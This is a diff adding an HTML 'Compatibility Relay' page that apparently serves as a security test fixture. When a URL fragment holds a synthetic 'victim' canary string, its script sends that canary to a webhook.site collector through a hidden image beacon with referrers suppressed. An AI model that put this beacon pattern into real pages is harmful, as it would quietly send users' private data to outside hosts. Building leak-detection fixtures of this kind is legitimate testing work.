@@ -1,0 +1,21 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="referrer" content="no-referrer">
+<title>Compatibility Relay</title>
+<div id="status">COMPATIBILITY_RELAY_READY</div>
+<script>
+  const expectedCanary = "VICTIM_PRIVATE_PREVIEW_20261106";
+  const fragment = new URLSearchParams(location.hash.slice(1));
+  const canary = fragment.get("canary");
+
+  if (canary === expectedCanary) {
+    const receipt = new Image();
+    receipt.referrerPolicy = "no-referrer";
+    receipt.src =
+      "https://webhook.site/dc3d2613-f9e0-4105-80d5-0f3c9328557c" +
+      "?source=cross-widget-relay" +
+      "&canary=" + encodeURIComponent(expectedCanary);
+    document.getElementById("status").textContent =
+      "SYNTHETIC_CANARY_RELAY_DISPATCHED";
+  }
+</script>
